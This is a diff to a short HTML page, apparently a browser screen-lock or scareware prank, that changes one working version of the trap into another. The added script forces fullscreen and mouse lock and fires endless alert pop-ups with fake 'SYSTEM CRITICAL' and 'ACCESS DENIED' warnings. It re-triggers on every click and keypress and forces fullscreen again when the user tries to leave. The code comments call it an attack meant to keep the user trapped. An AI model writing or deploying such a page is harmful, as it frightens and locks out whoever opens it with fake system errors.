@@ -1,52 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ UI LOCK ⚡</title>
+    <title>⚡ INSTANT LOCK ⚡</title>
     <style>
         body { 
-            background: #000; color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            height: 100vh; margin: 0;
-            display: flex; align-items: center; justify-content: center;
-            overflow: hidden; cursor: none;
+            background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; 
+            height: 100vh; margin: 0; display: flex; align-items: center; 
+            justify-content: center; overflow: hidden; cursor: none;
         }
-        h1 { font-size: 2rem; text-align: center; }
+        h1 { font-size: 3rem; text-shadow: 0 0 20px #f00; text-align: center; }
     </style>
 </head>
 <body>
-    <h1>[ CLICK TO INITIALIZE ]</h1>
+    <h1>[ SYSTEM OVERLOAD ]</h1>
 
     <script>
-        function startSpam() {
-            // 1. Force Fullscreen and Lock Mouse
-            const reLock = () => {
-                document.documentElement.requestFullscreen().catch(() => {});
-                document.body.requestPointerLock();
-            };
+        function attack() {
+            // 1. Instant Fullscreen + Mouse Trap
+            document.documentElement.requestFullscreen().catch(() => {});
+            document.body.requestPointerLock();
 
-            // 2. The Pop-up Loop
-            // This waits 10ms after you click "OK" then pops another one.
-            // This keeps the UI responsive but keeps the user trapped.
-            const spam = () => {
-                reLock();
-                alert("⚠ CRITICAL ERROR ⚠\nUNAUTHORIZED INTERACTION DETECTED");
-                alert("⚠ SYSTEM LOCK ⚠\nRE-ESTABLISHING FULLSCREEN MODE");
-                alert("⚠ WARNING ⚠\nDO NOT ATTEMPT TO EXIT");
+            // 2. The Pop-up Spam
+            // We use a tiny timeout so the browser doesn't completely freeze,
+            // allowing it to process the Fullscreen request before the next alert.
+            setTimeout(() => {
+                alert("⚠ SYSTEM CRITICAL ⚠\nRE-LOCKING INTERFACE...");
+                alert("⚠ ACCESS DENIED ⚠");
+                alert("⚠ FULLSCREEN OVERRIDE ⚠");
                 
-                // Triggers the next set of alerts almost immediately
-                setTimeout(spam, 10);
-            };
-
-            spam();
+                // Immediately call itself back
+                attack(); 
+            }, 1);
         }
 
-        // Activate on click
-        window.onclick = startSpam;
+        // Trigger on any interaction
+        window.onclick = attack;
+        window.onkeydown = attack;
 
-        // Re-trigger if they try to use keyboard shortcuts
-        window.onkeydown = (e) => {
-            startSpam();
+        // Force snap-back if they try to escape
+        document.onfullscreenchange = () => {
+            if (!document.fullscreenElement) {
+                attack();
+            }
         };
     </script>
 </body>
 </html>
+
